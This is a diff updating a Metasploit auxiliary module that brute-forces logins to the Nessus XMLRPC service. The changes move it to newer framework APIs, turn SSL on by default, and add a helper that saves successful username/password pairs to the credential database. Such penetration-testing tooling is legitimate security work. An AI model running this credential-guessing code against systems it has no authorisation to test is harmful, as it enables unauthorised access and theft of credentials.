@@ -1,16 +1,9 @@
 ##
-# nessus_xmlrpc_login.rb
-##
-
-##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
@@ -24,7 +17,8 @@ class Metasploit3 < Msf::Auxiliary
         specific user/pass.
       },
       'Author'         => [ 'Vlatko Kosturjak <kost[at]linux.hr>' ],
-      'License'        => MSF_LICENSE
+      'License'        => MSF_LICENSE,
+      'DefaultOptions' => { 'SSL' => true }
     )
 
     register_options(
@@ -32,12 +26,7 @@ class Metasploit3 < Msf::Auxiliary
         Opt::RPORT(8834),
         OptString.new('URI', [true, "URI for Nessus XMLRPC login. Default is /login", "/login"]),
         OptBool.new('BLANK_PASSWORDS', [false, "Try blank passwords for all users", false])
-      ], self.class)
-
-    register_advanced_options(
-    [
-      OptBool.new('SSL', [ true, "Negotiate SSL for outgoing connections", true])
-    ], self.class)
+      ])
   end
 
   def run_host(ip)
@@ -99,22 +88,44 @@ class Metasploit3 < Msf::Auxiliary
 
     if res.code == 200
       if res.body =~ /<status>OK<\/status>/
-        print_good("SUCCESSFUL LOGIN. '#{user}' : '#{pass}'")
-
-        report_hash = {
-          :host   => datastore['RHOST'],
-          :port   => datastore['RPORT'],
-          :sname  => 'nessus-xmlrpc',
-          :user   => user,
-          :pass   => pass,
-          :active => true,
-          :type => 'password'}
-
-        report_auth_info(report_hash)
+        print_good("SUCCESSFUL LOGIN. '#{user}':'#{pass}'")
+        report_cred(
+          ip: datastore['RHOST'],
+          port: datastore['RPORT'],
+          service_name: 'nessus-xmlrpc',
+          user: user,
+          password: pass
+        )
         return :next_user
       end
     end
-    vprint_error("FAILED LOGIN. '#{user}' : '#{pass}'")
+    vprint_error("FAILED LOGIN. '#{user}':'#{pass}'")
     return :skip_pass
+  end
+
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      last_attempted_at: DateTime.now,
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::SUCCESSFUL,
+    }.merge(service_data)
+
+    create_credential_login(login_data)
   end
 end
